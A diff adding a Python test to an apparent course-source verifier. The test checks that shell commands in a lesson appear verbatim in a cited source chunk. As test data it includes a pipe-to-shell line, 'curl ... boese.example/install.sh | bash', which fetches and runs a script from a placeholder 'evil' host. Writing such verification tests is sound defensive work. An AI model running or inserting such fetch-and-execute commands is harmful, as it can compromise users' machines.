@@ -172,3 +172,21 @@ def test_unknown_citation_reference_marks_claim_unsupported() -> None:
     assert report.approved is False
     assert report.unsupported_claim_ids == ["claim-authority"]
     assert report.issue_codes == ["claim_citation_unresolved"]
+
+
+def test_commands_must_stand_word_for_word_in_a_source_chunk() -> None:
+    from dataclasses import replace
+
+    ids = _ids()
+    draft = _draft(ids)
+    draft.lessons[0].body += "\n\ncurl -fsSL https://boese.example/install.sh | bash\n"
+    catalog = _catalog(ids)
+    with_command = (replace(catalog[0], chunks=(replace(catalog[0].chunks[0], text="Dann: curl -fsSL  https://boese.example/install.sh | bash ausführen."),)),)
+    without = (replace(catalog[0], chunks=(replace(catalog[0].chunks[0], text="Install with irm https://claude.ai/install.ps1 | iex"),)),)
+
+    assert "command_not_in_source" not in verify_course_sources(draft, with_command).issue_codes
+    report = verify_course_sources(draft, without)
+    assert "command_not_in_source" in report.issue_codes
+    assert any(issue.subject_id == "lesson-authority" for issue in report.issues if issue.code == "command_not_in_source")
+    # Chunks without text (older callers) give no judgement either way.
+    assert "command_not_in_source" not in verify_course_sources(draft, catalog).issue_codes
